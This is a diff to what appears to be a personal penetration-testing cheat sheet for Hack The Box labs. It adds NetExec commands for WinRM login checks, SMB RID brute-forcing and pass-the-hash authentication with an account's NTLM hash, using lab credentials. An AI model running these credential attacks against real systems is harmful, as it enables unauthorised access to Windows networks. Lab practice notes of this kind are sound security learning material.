@@ -18,5 +18,18 @@ nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
 
 #### Test WinRm login
 ```bash
-nxc winrm sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'
+nxc winrm sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3'
 ```
+
+#### Login with creds via SMB and brute force for passwords:
+```bash
+nxc smb 10.10.11.61 -u paul.taylor -p 'PASSSWORD1' --rid-brute
+```
+
+#### Verify Authtication with Hash
+```bash
+nxc smb 10.10.11.61 -u 'Haze-IT-Backup$' -H 723fd747a7523dbebfc5b1d3d759ffbf
+
+#Mote the above is a computer/service account
+```
+
